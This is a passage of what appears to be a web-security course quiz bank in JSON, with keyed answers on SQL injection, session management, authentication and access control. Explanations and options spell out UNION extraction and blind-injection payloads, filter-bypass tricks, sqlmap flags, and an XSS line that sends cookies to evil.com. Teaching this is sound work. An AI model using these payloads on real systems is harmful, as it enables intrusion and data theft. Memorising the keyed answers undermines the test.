e SQL syntax — next: submit O''Reilly to check if the error disappears, confirming SQL injection"], "a": 3, "e": "This is the Probe → Observe → Hypothesise step. Query became: WHERE lname='O'Reilly' — DB sees 'O' as name, Reilly' is invalid syntax."}, {"t": "W11. SQL Injection", "tp": "scenario", "q": "While probing with a single quote, you notice a JavaScript error in the returned page instead of a database error. What additional vulnerability does this suggest?", "o": ["The JavaScript error indicates the application uses a NoSQL database that processes queries through a JavaScript runtime", "The JavaScript error confirms SQL injection because the database passes its error messages through the JavaScript engine", "Client-side JavaScript errors are unrelated to server-side SQL injection and can be safely ignored during testing", "The unsanitized quote was injected into JavaScript in the response — cross-site scripting (XSS) attacks may also be possible"], "a": 3, "e": "User input often appears in JavaScript on the page. An unsanitized quote breaks the JS interpreter → reflected XSS potential."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "To verify numeric SQL injection when quotes are filtered, which expression equals 2 without using any quote characters?", "o": ["CHAR(50) — this returns the character '2' as a string, not the integer 2, so numeric comparison would fail", "67-ASCII('A') — this uses quotes around the character A, so it would be blocked by the filter and fail", "2+0 — this is trivially equivalent and doesn't prove SQL evaluation because any numeric parser would return the same result", "51-ASCII(1) — databases implicitly cast the integer 1 to string '1' (ASCII 49), so 51-49=2 with no quotes needed"], "a": 3, "e": "Implicit type casting: ASCII(1) treats 1 as character '1' (ASCII 49). 51-49=2. Works even when quotes are filtered."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "The MOVEit file transfer breach (2023) was caused by:", "o": ["An insider threat where a disgruntled employee exported customer files using their legitimate elevated access privileges", "A misconfigured firewall that exposed internal file storage directly to the internet without any application-layer protection", "SQL injection in the web application that let unauthenticated attackers access the database to read, modify, and delete data", "A zero-day authentication bypass in the admin panel that allowed unauthenticated attackers to create admin accounts"], "a": 2, "e": "CVE-2023-34362: SQLi in MOVEit Transfer. Led to mass data theft across thousands of organizations. Production input handling mistakes → severe consequences."}, {"t": "W11. SQL Injection", "tp": "theory", "q": "What is the most common injection point within SQL query STRUCTURE (not data values)?", "o": ["The FROM clause, where attackers inject additional table names using CROSS JOIN to access data from unrelated tables", "The WHERE clause, where attackers inject conditions that alter which rows are returned by the original query logic", "The SELECT clause, where attackers inject additional column names to extract data from other tables in the same query", "The ORDER BY clause — users often control sorting, and no quote escaping is needed since the input isn't in a data context"], "a": 3, "e": "Detect by: supplying numeric values (1,2,3...) — if ordering changes, it's ORDER BY. If number > column count → error. Confirm: 1 ASC -- vs 1 DESC --."}, {"t": "W11. SQL Injection", "tp": "theory", "q": "For a UNION-based SQL injection to succeed, what must be true about the injected query?", "o": ["The injected query can have any number of columns as long as at least one column contains the data the attacker wants", "The UNION operator only works with MySQL databases; other DBMSs require UNION ALL for cross-query result merging", "The attacker must know the database administrator password to execute UNION queries against system catalog tables", "Both SELECT statements must have the same number of columns, compatible data types, in the same order"], "a": 3, "e": "This is why attackers first determine column count (NULL ladder) and find text-compatible columns before extracting data."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "What does the 'NULL ladder' technique accomplish in a UNION injection attack?", "o": ["It fills the target table with NULL values, effectively wiping the data to cover the attacker's tracks after extraction", "It creates NULL-valued entries in the session table, forcing all existing users to re-authenticate and exposing their tokens", "It sets all WHERE clause conditions to NULL, bypassing authentication by making every comparison evaluate to true", "It progressively adds NULL columns to a UNION SELECT until the query succeeds, revealing the original query's column count"], "a": 3, "e": "NULL converts to any data type. Add NULLs incrementally until the query works → that count matches the original. Then replace each NULL with 'a' to find string columns."}, {"t": "W11. SQL Injection", "tp": "scenario", "q": "Vulnerable search returns 3 columns (first 2 are text). You want to enumerate the entire database schema. What payload extracts all table and column names?", "o": ["' OR 1=1 -- which returns all rows from the current table, indirectly revealing the schema through column headers", "' DROP TABLE information_schema -- which removes the metadata table, forcing the database to rebuild it with verbose error output", "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns -- which queries the metadata catalog", "' UNION SELECT @@version, NULL, NULL -- which extracts the database version string containing embedded schema metadata"], "a": 2, "e": "information_schema.columns has all table/column metadata. @@version only gets the DB version — useful but not schema enumeration."}, {"t": "W11. SQL Injection", "tp": "theory", "q": "When extracting multiple columns through a single text column, the Oracle concatenation syntax is:", "o": ["username+':'+password — the MS-SQL string addition operator that implicitly casts non-string types before joining", "username ' ' password — MySQL's implicit concatenation using space-separated string literals within the SELECT clause", "username||':'||password — Oracle's pipe operator concatenates strings, combining multiple values into one result field", "CONCAT(username,':',password) — the standard MySQL function that takes multiple arguments separated by commas"], "a": 2, "e": "Oracle: ||, MS-SQL: +, MySQL: CONCAT(). Concatenation reduces the number of text columns needed to extract data."}, {"t": "W11. SQL Injection", "tp": "theory", "q": "To submit the payload <code>1+1</code> as a numeric injection test in a URL, it must be encoded as:", "o": ["1%2b1 — the literal plus sign must be encoded because + represents a space character in URL query string encoding", "1&1 — the ampersand is the standard SQL addition operator when used within URL query string parameter values", "1%201 — spaces are the correct separator for numeric expressions in URL-encoded SQL injection payloads", "1+1 — no encoding is needed because the browser automatically preserves the plus symbol in URL query parameters"], "a": 0, "e": "+ means space in URL encoding. Literal + must be %2b. Also: & → %26, = → %3d, ; → %3b."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "To extract the database version via a UNION injection with 3 columns (first is text), which payload works?", "o": ["' OR @@version -- which appends the version as a boolean condition in the WHERE clause of the original query", "' UNION SELECT version, NULL, NULL -- which references the version column in the currently selected table", "' UNION SELECT @@version, NULL, NULL -- which places the version string in the first text-compatible column", "' UNION SELECT DB_VERSION(), NULL, NULL -- which calls the standard SQL function for retrieving server metadata"], "a": 2, "e": "@@version is a system variable in MySQL/MSSQL. First determine column count with NULL ladder, find a text column, then extract."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "What is second-order SQL injection and why does escaping input at insertion time fail to prevent it?", "o": ["It targets the second database in a multi-database architecture where cross-database queries bypass the primary server's input filters", "Data is safely escaped during INSERT, but when later retrieved and used in a new query without parameterization, the stored payload triggers injection", "It requires two separate attackers coordinating their payloads to trigger a race condition in the database transaction processor", "It's the same as regular SQL injection but requires two separate injection points in the same HTTP request"], "a": 1, "e": "The DB stores actual characters (including quotes). The second query trusts 'data from our own database'. Fix: parameterize everywhere, not just the initial input."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "An application only returns numeric employee IDs. SQL injection is confirmed. How can you extract the admin password?", "o": ["String extraction is impossible through a numeric-only output channel — switch to a different attack vector entirely", "Use ASCII() and SUBSTRING() to convert each password character to its numeric ASCII value, extracting one character per query", "Use a UNION query with text columns — the application will display the password string in the numeric output field", "Use time-based delays to encode the entire password as a variable-length pause, measuring milliseconds per character"], "a": 1, "e": "E.g., ' UNION SELECT ASCII(SUBSTRING(password,1,1)),NULL,NULL FROM users WHERE username='admin' # returns 113='q'. Repeat per position."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "What is blind SQL injection using conditional responses?", "o": ["The attacker infers data by observing different application behavior (e.g., login success vs failure) when injecting true vs false conditions", "An injection technique where the attacker cannot see the database but can access the application's source code to deduce the schema", "An attack where the database intentionally returns no results to any injected query as a security measure against data exfiltration", "A technique that works only against applications with no visual output, requiring the attacker to intercept raw network packets"], "a": 0, "e": "E.g., admin' AND ASCII(SUBSTRING(password,1,1))=113 # — login succeeds means first char is ASCII 113='q'. Slow but effective."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "To check if username 'alice' exists via conditional errors: <code>SELECT 1/0 FROM dual WHERE (SELECT username FROM users WHERE username='alice')='alice'</code>. Database returns an error. Meaning?", "o": ["Alice IS a valid username — the WHERE matched, 1/0 was evaluated, and division-by-zero caused the error", "The users table doesn't exist in the database, so the subquery failed and triggered a table-not-found error", "The query syntax is invalid because the dual table doesn't support subqueries in the WHERE clause on this DBMS", "Alice does NOT exist — the database always evaluates the SELECT clause before checking the WHERE condition"], "a": 0, "e": "If alice doesn't exist, WHERE returns no rows, 1/0 is never evaluated → no error. Error = alice exists. dual is a dummy table in most DBMSs."}, {"t": "W12. SQLi Advanced", "tp": "mcq", "q": "When blind SQL injection shows no behavioral difference for true vs false conditions, what technique extracts data?", "o": ["Switch to cross-site scripting to extract data through the browser's developer console instead of the server's response", "The attack is impossible — without any observable difference, no information can be extracted from the database", "Directly modify the application's server-side source code to add debugging output that reveals query results", "Time-based blind injection — inject conditional delays (BENCHMARK, SLEEP) that cause measurable timing differences in server responses"], "a": 3, "e": "BENCHMARK(5000000,SHA1('x')) causes delay when condition is true. Slow response = true, fast = false. Extracts one bit at a time."}, {"t": "W12. SQLi Advanced", "tp": "multi", "q": "Which techniques bypass naïve keyword-blocking SQL injection filters?", "o": ["Double-word nesting like SELSELECTECT — the filter removes the inner SELECT, leaving a valid SELECT keyword behind", "Using parameterized queries with bound variables to separate the SQL structure from user-supplied data values", "URL encoding keywords like %53%45%4c%45%43%54 which decode to SELECT after passing through filters that run before decoding", "Case variations like SeLeCt which are treated as valid SQL keywords by the database but missed by case-sensitive filters"], "m": [0, 2, 3], "e": "Also: %00SELECT (null byte), inline comments SELECT/**/username. Parameterized queries are a defense, not a bypass technique."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "A filter blocks the comment characters <code>--</code> and <code>#</code>. How can an attacker handle the trailing quote?", "o": ["URL-double-encode the comment as %252d%252d so the application decodes it to -- after the filter has already been applied", "Balance the quotes naturally using a tautology like ' OR 'a'='a so the original query's trailing quote completes the expression", "The attack is impossible without comment characters because there is no way to neutralize the trailing single quote", "Use the CHAR(45)+CHAR(45) function to construct the -- comment dynamically, bypassing the character-level filter"], "a": 1, "e": "Balancing quotes: lname='John' OR 'a'='a' closes naturally. Also: CHAR() function for blocked chars, inline comments /**/ for whitespace."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "A filter blocks all whitespace characters in SQL input. How can valid SQL still be constructed?", "o": ["Use CONCAT() to build the entire query as a single concatenated string with no whitespace between any SQL keywords", "Use inline comments /**/ as whitespace substitutes: <code>SELECT/**/username,password/**/FROM/**/users</code>", "SQL requires whitespace between keywords and cannot function without at least single space characters separating clauses", "Replace spaces with tab characters, since most filters only block the ASCII space (0x20) but not horizontal tab (0x09)"], "a": 1, "e": "SQL comments /**/ are treated as whitespace by the parser. Some DBs also accept alternative whitespace: tabs, newlines, %09, %0a."}, {"t": "W12. SQLi Advanced", "tp": "multi", "q": "Which are the two effective methods for preventing SQL injection?", "o": ["Stored procedures with properly typed parameters where user input fills values but cannot change the SQL syntax or structure", "Input validation using blacklists that block known dangerous characters like quotes, semicolons, and comment symbols", "Parameterized queries (prepared statements) where the database receives the query template and user values as separate data", "Escaping all single quotes by doubling them ('') in user input before concatenating into dynamically built SQL strings"], "m": [0, 2], "e": "Blacklists and escaping are bypassable (second-order injection, encoding tricks). Stored procs NOT safe if they internally concatenate input. Parameterization is the primary defense."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "A developer escapes all quotes. User registers as <code>admin'--</code>. The escaped INSERT works. Later, the password change function reads this username and uses it in a new query. What happens?", "o": ["Only a harmless syntax error occurs in the password change query — the application catches the exception and displays a generic error", "Second-order SQL injection — the DB stores literal admin'--, which breaks the password change query when concatenated without parameterization", "The database rejects the stored username when it's retrieved because the quote character violates column validation constraints", "Nothing — the escape (admin''--) persists in the database, so the retrieved value is still safely escaped for any subsequent query"], "a": 1, "e": "INSERT: admin''-- → DB stores admin'--. Password change: WHERE username='admin'-- → quote breaks out, -- comments rest. Fix: parameterize everywhere."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "You submit <code>O'Reilly</code> and get a DB error. You submit <code>O''Reilly</code> and the error disappears. What do you conclude?", "o": ["Likely SQL injection — the single quote broke SQL syntax, and '' was interpreted as an escape sequence, confirming the input reaches SQL", "The double apostrophe created a syntax error that the database silently ignored, masking the underlying vulnerability from detection", "The application has a strict input validation filter that rejects single apostrophes but accepts escaped double apostrophes", "The application correctly sanitized the input by replacing dangerous characters, indicating it is NOT vulnerable to injection"], "a": 0, "e": "'' is the SQL escape for a literal single quote. Next: verify with DB-specific concatenation operators to confirm SQL evaluation."}, {"t": "W12. SQLi Advanced", "tp": "mcq", "q": "What is the most widely-used automated SQL exploitation tool?", "o": ["Metasploit — while known for general exploitation, its auxiliary modules are the primary choice for automated SQL injection campaigns", "sqlmap — it brute-forces parameters, tries UNION/boolean/time-based techniques automatically, and supports all major DBMSs", "Nmap — primarily a network scanner, but its NSE scripts include comprehensive SQL injection testing and exploitation modules", "Wireshark — its deep packet inspection can detect SQL injection payloads in real-time traffic and extract the resulting database responses"], "a": 1, "e": "sqlmap options: --forms (HTML forms), --banner (DBMS version), --dbs (databases), --tables, --dump (data), --os-shell. Steps: brute params → UNION → boolean → time."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "Why do stored procedures NOT automatically guarantee protection against SQL injection?", "o": ["Stored procedures are always safe because they are compiled and executed inside the database server by definition", "Stored procedures are deprecated by OWASP and should not be used for any security-critical database operations", "Stored procedures only protect against injection when used with Oracle databases; other DBMSs lack the necessary security features", "If a stored procedure internally builds dynamic SQL by concatenating user input, it remains just as vulnerable to injection"], "a": 3, "e": "Stored procs prevent SQLi ONLY if they use parameterized inputs internally. Never build SQL with user strings inside procedures. Most modern frameworks enforce parameterization by default."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "Attacking a web application or server without authorization is:", "o": ["Legal if you discover and responsibly disclose vulnerabilities to the application owner through a bug bounty program", "Acceptable when performed for educational purposes or academic research on publicly accessible internet-facing applications", "Illegal — only test systems you own or have explicit written permission to test, regardless of your intentions or methodology", "Permitted during business hours when using automated scanning tools that do not attempt to exploit any discovered vulnerabilities"], "a": 2, "e": "Explicitly stated in the course: unauthorized testing is a criminal offense in most jurisdictions."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "According to OWASP, what should be the default defensive control against SQL injection?", "o": ["Character escaping applied to all user inputs before they are incorporated into any dynamically constructed SQL strings", "Parameterization — most modern frameworks enforce parameterized queries by default, treating user input strictly as data", "Stored procedures exclusively, with no parameterized queries allowed at the application layer to prevent confusion", "Comprehensive input validation using whitelists of allowed characters for each field type in the application"], "a": 1, "e": "OWASP supports parameterization as the default. Stored procs are secondary. Never build SQL with user strings. ~2/3 to 4/5 of web DBs now use parameterized queries."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "You only have one low-privilege user account. What techniques test for access control flaws?", "o": ["Only test the login page for brute-force vulnerabilities, since access control testing without admin access is unreliable", "Scan for SQL injection vulnerabilities first, since a successful injection automatically bypasses all access control mechanisms", "Add parameters like admin=true to URLs/POST bodies; test Referer-based controls; review client-side HTML/JS for hidden URLs; test identifier predictability", "Access control testing requires at least two accounts with different privilege levels — report the limitation and skip this test"], "a": 2, "e": "With limited access: add access params, test/remove Referer, review client code, enumerate identifiers, test for predictable sequences, automate harvesting if broken."}, {"t": "W08. Authentication", "tp": "multi", "q": "Which are genuine trade-offs of using third-party authentication services like OAuth 2.0?", "o": ["The user's password is transmitted in plaintext to the application, which then forwards it to the identity provider for verification", "If the third-party provider suffers an outage, all dependent applications lose the ability to authenticate users", "Privacy implications arise because user data is shared with the identity provider, requiring clear policies on data handling", "Custom-built authentication vulnerabilities are avoided because the complexity is delegated to a specialized provider"], "m": [1, 2, 3], "e": "OAuth uses tokens — passwords are NEVER sent to the application. The real trade-offs: provider dependency, privacy concerns from data sharing, and the benefit of avoiding custom auth flaws."}, {"t": "W08. Authentication", "tp": "scenario", "q": "The LinkedIn breach (2012) exposed 110 million hashed passwords, and the Ubuntu Forums breach (2013) exposed 1.8 million. What critical storage failure did both share?", "o": ["Both used bcrypt with insufficient work factors, allowing GPU-accelerated brute-force attacks to crack all hashes within hours", "Both stored passwords in reversible Base64 encoding instead of cryptographic hashing, allowing instant decoding of all credentials", "Both used AES encryption for passwords, which was broken by a then-new side-channel attack on the cipher implementation", "Both stored password hashes without unique salts — LinkedIn used unsalted SHA-1 and Ubuntu Forums used unsalted MD5, making both vulnerable to rainbow tables"], "a": 3, "e": "LinkedIn: unsalted SHA-1 hashes → rainbow tables. Ubuntu Forums: unsalted MD5 + the breach itself was via SQL injection in vBulletin. Both demonstrate why salting is non-negotiable."}, {"t": "W08. Authentication", "tp": "multi", "q": "An audit reveals a password change page with poor design. According to the slides, which of these are flaws in password change functionality?", "o": ["No confirmation of change — no message or email informs the user that their password was actually changed successfully", "No additional security measures — no verification code sent to email or phone to validate the change request is legitimate", "Strict rate limiting on the password change endpoint that prevents more than 3 attempts per hour per account", "No password strength requirements — the system accepts any new password regardless of length, complexity, or character mix"], "m": [0, 1, 3], "e": "The slide shows 5 flaws: (1) no strength requirements, (2) no strength feedback, (3) no confirmation of change, (4) no security measures like verification codes, (5) no error messages when current password is wrong or new passwords don't match. Rate limiting is a good practice, not a flaw."}, {"t": "W08. Authentication", "tp": "mcq", "q": "How does a rainbow table attack differ from a brute-force attack on password hashes?", "o": ["Brute force uses precomputed tables while rainbow tables generate hashes in real-time during the attack execution", "Both approaches are identical in speed and storage requirements but differ only in which hashing algorithms they can target", "Rainbow tables use precomputed hash-to-password mappings for fast offline lookup and require significant storage; brute force tries every combination in real-time using computational power", "Rainbow tables can only crack passwords shorter than 8 characters while brute force works on passwords of any length"], "a": 2, "e": "Rainbow table: trades computation time for storage space (precomputed), highly effective against unsalted hashes, defeated by salting. Brute force: relies on computation, guaranteed to find eventually, mitigated by strong passwords + lockout + rate limiting."}, {"t": "W12. SQLi Advanced", "tp": "mcq", "q": "The W12 slides show multiple recent Fortinet SQLi CVEs (CVE-2026-21643, CVE-2025-25257, CVE-2023-48788). What does this pattern demonstrate?", "o": ["All three vulnerabilities were caused by the same single line of code that Fortinet failed to patch across three consecutive releases", "SQL injection remains a persistent, critical vulnerability even in major security vendors' products — the same class of flaw keeps recurring in production systems", "Fortinet products are uniquely vulnerable compared to other vendors due to their use of an outdated proprietary database engine", "These CVEs only affected development environments and were patched before any production deployments were compromised"], "a": 1, "e": "The slides use these CVEs alongside MOVEit (CVE-2023-34362) to show that SQLi 'still breaks big brands'. Critical SQLi in security products underscores why parameterization must be the default."}, {"t": "W10. Access Controls", "tp": "mcq", "q": "The slides pose: 'Which is riskier — vertical or horizontal privilege escalation?' What is the generally accepted answer?", "o": ["Horizontal is riskier because it exposes a larger volume of user data across the entire user base simultaneously", "Both are equally risky in all cases — the impact depends entirely on the specific application context and the data involved", "Vertical is generally considered riskier because it grants access to administrative functions, potentially leading to full application compromise", "Neither is inherently risky — privilege escalation only matters if the attacker also has network-level access to the server"], "a": 2, "e": "Vertical escalation (user → admin) can lead to full application takeover. However, horizontal escalation can also be devastating depending on the data (e.g., financial records, medical data). Context matters, but vertical is generally considered higher severity."}, {"t": "W09. Session Management", "tp": "mcq", "q": "When is an application vulnerable to session fixation?", "o": ["When the logout function deletes only the client-side cookie but the server retains the session record indefinitely", "When the login process always issues a brand new session token, invalidating any previously existing token for that user", "When the application accepts and uses attacker-supplied session IDs without issuing a fresh token after successful login", "When cookies use the Secure flag incorrectly, causing them to be transmitted over unencrypted HTTP connections"], "a": 2, "e": "Session fixation: attacker pre-sets a known session ID → victim logs in → that ID is now authenticated. Fix: ALWAYS issue a new token on successful login. The key condition is accepting externally supplied IDs."}, {"t": "W08. Authentication", "tp": "mcq", "q": "Which of the following is a common design flaw in authentication mechanisms?", "o": ["Using HTTPS with current TLS versions for all credential transmission between client and server", "Implementing account lockout policies that disable accounts after a configurable number of failed authentication attempts", "Requiring passwords to meet minimum length, complexity, and uniqueness criteria before accepting them for registration", "Verbose failure messages that reveal whether the username, the password, or both were incorrect during a failed login"], "a": 3, "e": "HTTPS, lockout, and strong password requirements are all GOOD practices. Verbose failure messages are a design flaw — they enable username enumeration."}, {"t": "W08. Authentication", "tp": "scenario", "q": "A login page shows 'Login failed. Please try again.' to the user. But the HTML source contains: <code>&lt;!-- AUTH_FAIL_REASON: INVALID_PASSWORD --&gt;</code> and <code>&lt;!-- USER_LOOKUP: FOUND userId=84219 (j.singh) --&gt;</code>. What is the risk?", "o": ["HTML comments are encrypted by the browser before rendering, so only the server can read them in subsequent requests", "The comments reveal the exact failure reason, a valid user ID, and username — an attacker viewing the source can enumerate accounts even though the visible page is generic", "The comments only appear in development environments and are automatically stripped by the web server in production builds", "No risk — HTML comments are not displayed to users so they cannot be exploited by attackers viewing the page"], "a": 1, "e": "Even identical-looking error pages may leak information in HTML source: AUTH_FAIL_REASON, USER_LOOKUP with userId and username, ATTEMPT_COUNT, server NODE, TXID, timestamps, stack traces, and debug flags."}, {"t": "W09. Session Management", "tp": "scenario", "q": "A token is encoded in base36 as <code>h2g5d0</code> (decodes to 1234567). You login 1 second later and get <code>h2g5d3</code> (1234570). Increment per second = 3. Someone logs in 15 seconds later. What is their predicted token value?", "o": ["1234570 + 15 = 1234585 — simply add the number of seconds to the last observed token value", "Cannot be predicted because the increment pattern changes randomly after every 10 token generations", "1234567 × 15 = 18518505 — multiply the original token by the elapsed seconds for the predicted value", "1234567 + (15 × 3) = 1234612 — convert back to base36 to get the predicted token string"], "a": 3, "e": "The slide gives this exact activity. Token value = base value + (seconds × increment per second). 1234567 + (15×3) = 1234612. Convert to base36 to get the token string."}, {"t": "W09. Session Management", "tp": "scenario", "q": "The summary table from the slides lists 'Storage (client): localStorage' as a weakness. What specific attack does this enable?", "o": ["Session fixation — localStorage tokens can be pre-set by an attacker before the victim authenticates on the same device", "CSRF — the browser automatically includes localStorage data in cross-origin requests initiated from attacker-controlled pages", "Network eavesdropping — localStorage values are transmitted in cleartext as part of every HTTP request header", "XSS theft — unlike HttpOnly cookies, localStorage values are fully accessible to JavaScript, so any XSS vulnerability exposes the token"], "a": 3, "e": "localStorage is accessible via document.localStorage in JavaScript. With no encryption and no HttpOnly equivalent, any XSS vulnerability = token stolen. Cookies with HttpOnly block this."}, {"t": "W09. Session Management", "tp": "scenario", "q": "The slides warn that URLs with tokens can be exposed via shoulder surfing, screenshots, and compromised clipboards. These are examples of which token handling weakness?", "o": ["Client exposure to token hijacking — shoulder surfing is a form of cross-site scripting that targets the browser's URL bar display", "Disclosure of tokens on the network — tokens in URLs are visible on screen and in browser history, making them accessible to physical and local attacks", "Vulnerable session termination — the tokens remain visible on screen because the application failed to clear the URL after authentication", "Liberal cookie scope — the token domain is set too broadly, allowing physical-proximity attackers to intercept the cookie"], "a": 1, "e": "URLs are visible on screen (shoulder surfing, screenshots), saved in browser history (auto-complete searches), stored in clipboards (copy-paste), and logged by servers/proxies."}, {"t": "W09. Session Management", "tp": "mcq", "q": "The summary table lists 'Validation: Server doesn't validate' as a weakness. What attack does this enable?", "o": ["Brute-force — the server's lack of validation means it doesn't count failed authentication attempts using invalid tokens", "Session fixation — the server accepts any token format without checking whether it was originally issued by the application", "Network eavesdropping — without validation, the server transmits tokens over HTTP instead of HTTPS for performance reasons", "Token modification — if the server doesn't validate the token's integrity, an attacker can modify its contents (e.g., change the user ID embedded in it)"], "a": 3, "e": "If the server doesn't validate token integrity (no signature/HMAC), attackers can modify token contents. This enables both meaningful token manipulation and encrypted token bit-flipping."}, {"t": "W09. Session Management", "tp": "mcq", "q": "The summary table lists 'Usage: No re-auth for sensitive ops' → 'Attacker can transfer money'. What does this mean?", "o": ["The application requires re-authentication before every single page load, which creates performance bottlenecks for financial transactions", "The application stores financial transaction data in the session token itself, allowing attackers to modify transfer amounts by editing the token", "Once an attacker has a valid session (via any hijacking method), they can perform sensitive operations like fund transfers without being challenged again", "Re-authentication is only needed for login and logout operations, not for in-session actions like transferring money between accounts"], "a": 2, "e": "Best practice: require re-authentication (password or MFA) before sensitive operations (money transfers, email changes, password changes) even within an active session."}, {"t": "W09. Session Management", "tp": "theory", "q": "Linear congruential generators (LCGs) are explicitly mentioned as NOT secure for token generation. Why?", "o": ["LCGs are deterministic algorithms with predictable sequences — once an attacker observes enough outputs, they can recover the internal state and predict all future tokens", "LCGs require hardware random number generators that are not available on standard web servers, making them impractical to deploy", "LCGs produce output that is too short to be used as session tokens — their maximum output length is limited to 16 bits", "LCGs are secure for token generation but are too slow for high-traffic web applications, causing unacceptable authentication delays"], "a": 0, "e": "LCGs (and Math.random(), mt_rand(), java.util.Random) have predictable internal states. Given enough observed outputs, the entire sequence can be reconstructed. Use CSPRNGs instead."}, {"t": "W09. Session Management", "tp": "scenario", "q": "An application issues session tokens to unauthenticated users (e.g., for shopping cart tracking). After login, the same token is used. Is this a session fixation risk?", "o": ["No — session fixation only applies when the attacker generates the token themselves, not when the application issues it naturally", "Only if the token is stored in localStorage; cookie-based pre-authentication tokens are immune to session fixation attacks", "Yes — an attacker can obtain a pre-authentication token, feed it to a victim, wait for the victim to log in, and then use that token to access the authenticated session", "No — pre-authentication tokens are separate from authentication tokens and cannot be used for session hijacking after login"], "a": 2, "e": "The slides describe this exact test: obtain pre-auth token → login → check if token changes. If not, vulnerable to fixation. Fix: always issue fresh token after successful authentication."}, {"t": "W09. Session Management", "tp": "multi", "q": "According to the session management lessons learned, which are required for secure session management?", "o": ["Protection of tokens throughout their lifecycle: transmission, expiration, no concurrent logins, restricted cookie scope", "Tokens with an exponentially large number of possible values generated by a strong source of pseudo-randomness", "Embedding the user's role and permissions directly in the token to reduce database queries and improve server performance", "Logging, monitoring, and alerting on suspicious session activity patterns across the application"], "m": [0, 1, 3], "e": "Session security requires end-to-end rigour. Strong authentication is not enough — session security must be designed, tested, and monitored continuously. Tokens should be opaque identifiers, never carrying embedded data."}, {"t": "W09. Session Management", "tp": "scenario", "q": "You test session expiration: log in, wait 2 hours without activity, then submit a request with the old token. The protected page still loads. What does this tell you?", "o": ["The server validated your IP address instead of the token, so the session appeared active even though the token had actually expired", "The application has a generous but acceptable timeout of 2+ hours, which is standard for low-risk applications like blogs", "The application has no server-side session timeout — tokens remain valid indefinitely, giving attackers an unlimited window to use stolen tokens", "The token was automatically refreshed by the browser via a background AJAX request, maintaining the session without user interaction"], "a": 2, "e": "The slides say: wait without using the token, then submit a request. If the page loads, the token is still active. Use trial and error to determine the actual timeout. Short timeouts reduce attack windows."}, {"t": "W09. Session Management", "tp": "scenario", "q": "You identify a search box that doesn't sanitize input. You inject <code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code>. What type of attack is this and what does it steal?", "o": ["CSRF — the script causes the victim's browser to make an authenticated request to the attacker's server with the current session cookie", "SQL injection — the script tag causes the database to execute a query that exports all cookie data to the attacker's server", "XSS-based session token theft — the injected JavaScript reads the victim's cookies (including session tokens) and sends them to the attacker's server", "Session fixation — the script replaces the victim's session cookie with a token controlled by the attacker for later reuse"], "a": 2, "e": "This is the XSS token hijacking technique from the slides. Without HttpOnly on the session cookie, JavaScript can read document.cookie and exfiltrate it. HttpOnly prevents this specific attack."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "The slides reference the MGM cyber attack as a real example of a multistage access control exploit. In the bank transfer example, what data does the attacker modify at the final stage?", "o": ["The TLS certificate — substituting a self-signed certificate that allows the attacker to intercept the bank's encrypted response", "The HTTP Referer header — changing it to appear as if the request originated from the bank's internal admin panel", "The session token — replacing it with an admin token that grants elevated privileges for the transfer authorization", "The source account number in a hidden form field — if the app doesn't revalidate at each stage, the attacker accesses another user's account"], "a": 3, "e": "The attack modifies hidden fields at the final stage. The app validated authorization at stage 1 (account selection) but assumed data forwarded to later stages was trustworthy."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "The slides show JavaScript code: <code>var isAdmin = false; if (isAdmin) { adminMenu.addItem('/menus/secure/ff457/addNewPortalUser2.jsp', 'create a new user'); }</code>. Even with <code>isAdmin=false</code>, why is this dangerous?", "o": ["The admin URL is now exposed in the client-side code — any user can simply navigate directly to that URL regardless of the JavaScript variable", "The JavaScript will be executed by the server during page rendering, potentially triggering the admin functionality for non-admin users", "The JavaScript variable can be changed to true in the browser console, which automatically grants the user admin privileges on the server", "The addItem function call sends an API request to the server that pre-authorizes the user for admin functionality on subsequent visits"], "a": 0, "e": "Changing isAdmin in the browser does nothing if there's server-side auth. But the URL '/menus/secure/ff457/addNewPortalUser2.jsp' is now visible. If the server doesn't check authorization, anyone can access it directly."}, {"t": "W10. Access Controls", "tp": "theory", "q": "The Optus 2023 breach is cited as a real-world example of which access control vulnerability?", "o": ["Completely unprotected functionality — the admin dashboard was accessible without any authentication or URL obfuscation", "Platform misconfiguration — the web application firewall rules failed to block automated scanning traffic from external IP addresses", "IDOR (Insecure Direct Object Reference) — attackers accessed 10 million customers' IDs via an API that didn't verify authorization for each requested record", "Location-based access control bypass — the attackers used a VPN to appear as internal users and bypass geographic IP restrictions"], "a": 2, "e": "Optus breach: IDOR in an API let attackers enumerate customer records by manipulating identifiers. 10 million customer IDs exposed. This is why OWASP ranks Broken Access Control as #1."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "You have an admin account and a regular user account. You use the admin account to discover the URL <code>/admin/deleteUser?id=5</code>. You then try this URL from the regular user account and it works. What type of escalation is this?", "o": ["Horizontal privilege escalation — the regular user accessed another user's data by manipulating the ID parameter in the request", "Context-dependent access control failure — the deletion was only supposed to be available during a specific maintenance time window", "Business logic exploitation — the user bypassed a required workflow step by directly accessing the deletion endpoint out of sequence", "Vertical privilege escalation — the regular user performed an admin-level function (deleting users) that their role should not permit"], "a": 3, "e": "This is the standard test methodology: (1) use admin to find all functionality, (2) try accessing it with a low-privilege account. If it works = vertical privilege escalation."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "You test an app that uses sequential document IDs (<code>docid=1001, 1002, 1003...</code>). You can access docid=1002 which belongs to another user. After confirming broken access control, what should you do next?", "o": ["Mount an automated attack to harvest sensitive resources, since both access controls and resource identifiers are broken — document the full scope of exposure", "Report only the single document access as the vulnerability, since automated exploitation goes beyond the scope of an access control assessment", "Attempt to modify the documents via 